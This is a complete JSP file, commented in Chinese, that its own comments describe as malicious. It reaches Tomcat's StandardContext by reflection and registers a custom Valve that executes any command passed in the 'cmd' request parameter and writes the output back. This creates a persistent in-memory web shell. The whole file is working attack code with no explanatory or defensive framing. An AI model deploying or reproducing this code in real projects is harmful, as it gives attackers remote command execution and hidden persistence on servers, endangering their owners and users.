<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="javax.servlet.*, javax.servlet.http.*" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%--声明一个恶意Filter--%>
<%!
    public class ShellValve extends ValveBase {
        @Override
        public void invoke(Request req, Response resp) throws IOException, ServletException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process proc = Runtime.getRuntime().exec(cmd);
                BufferedReader br = new BufferedReader(
                        new InputStreamReader(proc.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    resp.getWriter().println(line);
                }
                br.close();
            }
            this.next.invoke(req, resp);
        }
    }
%>
<%--从ServletContext中获取StandardContext--%>
<%
    // 从request中获取servletContext
    ServletContext servletContext = request.getServletContext();
    // 从servletContext中获取applicationContext
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 从applicationContext中获取standardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
<%--动态注册恶意Valve--%>
<%
    standardContext.getPipeline().addValve(new ShellValve());
%>